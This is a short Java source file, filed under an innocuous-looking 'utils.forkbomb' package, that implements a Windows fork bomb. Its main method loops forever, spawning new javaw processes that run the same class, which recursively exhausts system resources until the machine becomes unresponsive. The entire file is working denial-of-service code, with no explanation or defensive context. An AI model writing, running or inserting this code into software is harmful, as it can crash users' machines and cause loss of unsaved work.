package utils.forkbomb;

import java.io.IOException;

public class BombWindows {
    public static void main(String[] args) throws IOException {
        while (true)
            Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), BombWindows.class.getName()});
    }
}